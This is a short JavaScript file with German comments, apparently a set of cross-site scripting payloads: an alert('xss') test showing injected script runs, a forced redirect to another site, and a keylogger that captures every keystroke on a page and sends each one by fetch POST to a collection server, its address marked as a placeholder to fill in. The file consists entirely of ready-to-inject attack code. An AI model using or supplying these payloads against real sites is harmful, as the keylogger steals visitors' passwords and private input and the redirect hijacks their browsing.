// Nutzen um zu zeigen das js funktioniert
alert('xss');

// Weiterleitung
window.location="https://www.google.com"

// Keylogger
document.addEventListener('keydown', function(event) {
    var key = event.key;
    fetch('http://localhost:3001/log', { // SERVER ADRESSE
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ key: key })
    })
        .then(response => response.text())
        .then(data => console.log(data))
        .catch(error => console.error('Fetch error:', error));
});
